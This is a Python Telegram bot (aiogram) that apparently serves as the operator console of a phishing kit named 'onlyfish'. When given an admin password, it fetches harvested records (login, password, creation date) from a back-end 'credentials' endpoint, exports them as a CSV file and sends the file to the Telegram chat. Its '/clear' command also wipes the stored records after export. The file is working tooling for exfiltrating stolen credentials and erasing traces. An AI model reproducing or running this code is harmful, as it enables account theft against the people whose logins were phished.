import asyncio
import csv
import json
import logging
import os
import sys

import requests
from aiogram import Bot, Dispatcher, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.types import Message, FSInputFile

from modules.constants import TOKEN, ADMIN_PASSWORD, ONLYFISH_API_URL, EXPORTS_FOLDER

from datetime import datetime


# Initialize bot and dispatcher
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()

# Initialize temp directory
if not os.path.exists(EXPORTS_FOLDER):
    os.mkdir(EXPORTS_FOLDER)


def generate_file_name(extension='txt'):
    now = datetime.now()
    date_str = now.strftime('%Y-%m-%d_%H-%M-%S')
    file_name = f"export_{date_str}.{extension}"
    return file_name

def get(action: str):
    url = f"{ONLYFISH_API_URL}/{action}"
    print(f"url: {url}")
    return requests.get(url)

def delete(action: str):
    url = f"{ONLYFISH_API_URL}/{action}"
    print(f"url: {url}")
    return requests.delete(url)

def make_export():
    response = get('credentials')

    if response.status_code == 200:
        users = response.json()
        print(users)
    else:
        raise Exception(response.text)

    path = f'{EXPORTS_FOLDER}/{generate_file_name("csv")}_export.txt'
    fieldnames = ['_id', 'login', 'password', 'createdAt']

    if users and len(users) > 0 and isinstance(users, list):
        with open(path, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.DictWriter(file, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(users)

    return path

def delete_data():
    response = delete('credentials')

    if response.status_code == 200:
        return True
    else:
        raise Exception(response.text)

# Handlers
@dp.message(Command(commands=['onlyfish']))
async def command_start_handler(message: Message, state: FSMContext) -> None:
    command_parts = message.text.split(maxsplit=1)

    if len(command_parts) > 1 and command_parts[1] == ADMIN_PASSWORD:
        try:
            file_export_path = make_export()
            await message.answer_document(FSInputFile(file_export_path))
        except Exception as e:
            print(e)
            await message.answer(str(e))
    else:
        await message.answer(f'⚠️ PASSWORD IS WRONG ⚠️')


@dp.message(Command(commands=['clear']))
async def command_start_handler(message: Message, state: FSMContext) -> None:
    command_parts = message.text.split(maxsplit=1)

    if len(command_parts) > 1 and command_parts[1] == ADMIN_PASSWORD:
        try:
            file_export_path = make_export()
            await message.answer_document(FSInputFile(file_export_path))
            print('Зачистка...')
            delete_data()
            await message.answer("1312")
        except Exception as e:
            print(e)
            await message.answer(str(e))
    else:
        await message.answer(f'⚠️ PASSWORD IS WRONG ⚠️')


# Start bot
async def main() -> None:
    dp.include_router(router)
    await dp.start_polling(bot)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, stream=sys.stdout)
    asyncio.run(main())
